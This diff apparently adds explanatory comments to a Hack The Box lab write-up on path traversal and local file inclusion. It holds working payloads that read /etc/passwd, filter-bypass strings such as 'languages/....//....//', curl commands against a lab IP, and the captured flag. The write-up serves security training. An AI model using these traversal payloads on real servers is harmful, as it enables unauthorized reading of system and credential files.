@@ -60,6 +60,7 @@ from urllib.parse import quote
 p = quote('../../../../etc/passwd', safe='')
 # %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 ```
+> URL-encodes the entire traversal string. Setting `safe=''` encodes every character including dots and slashes. Use the resulting string as the parameter value.
 
 Or Burp Decoder → URL-encode all characters.
 
@@ -142,6 +143,7 @@ curl "http://TARGET/index.php?language=languages/../../../etc/passwd"
 curl "http://TARGET/index.php?language=languages/....//....//....//etc/passwd"
 # → /etc/passwd contents        ✅ both filters bypassed
 ```
+> Tests each bypass layer in sequence. First confirm what the filter blocks, then combine the approved-path prefix with the recursive traversal pattern. Both filters are bypassed together with `languages/....//....//....//etc/passwd`.
 
 ### Read the flag
 
@@ -149,6 +151,7 @@ curl "http://TARGET/index.php?language=languages/....//....//....//etc/passwd"
 curl -sk "http://154.57.164.80:31040/index.php?language=languages/....//....//....//....//flag.txt" \
   | grep -iE 'HTB\{'
 ```
+> Uses both bypasses combined: the `languages/` prefix satisfies the regex, and `....//` survives the one-pass strip. Adds an extra `....//` for safety. Pipes to `grep` to extract just the flag string.
 
 **Flag:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`
 
